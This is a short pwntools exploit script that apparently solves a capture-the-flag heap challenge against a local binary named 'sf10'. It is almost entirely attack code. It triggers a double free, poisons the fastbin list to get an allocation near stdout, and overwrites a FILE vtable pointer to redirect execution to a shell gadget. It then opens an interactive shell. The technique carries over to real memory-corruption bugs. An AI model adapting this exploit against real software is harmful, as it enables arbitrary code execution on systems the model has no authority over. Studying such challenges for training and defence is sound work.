from pwn import*

p=process('./sf10')
target=0x60207a
puts_plt=0x400770
system=0x400946
vtable=0x602118

def menu(number):
        p.sendlineafter('2 delete \n',str(number))

def add(index,length,content):
        menu(1)
        p.sendlineafter('(0-11):',str(index))
        p.sendlineafter('Length:',str(length))
        p.sendlineafter('C:',content)

def delete(index):
        menu(2)
        p.sendlineafter('(0-11):',str(index))

add("11", 0x200, p64(0) * 2 + p64(0x400946)*60)

add("0", "48", "a"*4)
add("1", "48", "b"*4)
add("2", "48", "c"*4)
#add("2", "56", '\x00'*16+p64(0x400946)*5) # &ptr[2] : 0x6020d0 : fake table
#add("3", "56", p64(0x400946)*7)

delete("0")
delete("1")
delete("0") # DF


add("3", "48", p64(0x6020a0 + 0x20 - 70)) # &stdout - 38

add("4", "48", "\x00"*8)
add("5", "48", "\x00"*8)


pl = "\x00"*22
pl += p64(0x602118 - 216)
raw_input()
add("10", "48", pl)

p.interactive()

